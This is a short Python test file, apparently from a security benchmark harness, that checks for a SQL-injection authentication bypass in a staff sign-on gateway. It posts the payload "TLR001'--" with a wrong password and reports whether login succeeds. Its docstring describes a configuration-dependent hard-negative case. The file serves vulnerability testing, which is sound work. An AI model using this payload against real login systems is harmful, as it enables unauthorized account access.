"""LG-SQLI-001 proof-of-exploit: SQL-injection auth bypass in the single-query staff sign-on.

Fires when the injected staff_id "TLR001'--" authenticates WITHOUT TLR001's password, i.e. the
concatenated query path is live. This is only reachable under a profile with session_roaming=on
(exploitable); under session_roaming=off the same payload returns authenticated=false, so the
trigger does not fire (the hard-negative case). Env: GATEWAY_URL.
"""

from harness import env, http


def fire():
    reply = http.post_json(
        f"{env.url('GATEWAY_URL')}/authenticate",
        {"staff_id": "TLR001'--", "password": "not-the-password"},
    )
    if reply.json().get("authenticated") is True:
        return True, f"auth bypass -> {reply.text}"
    return False, f"payload rejected: {reply.text}"
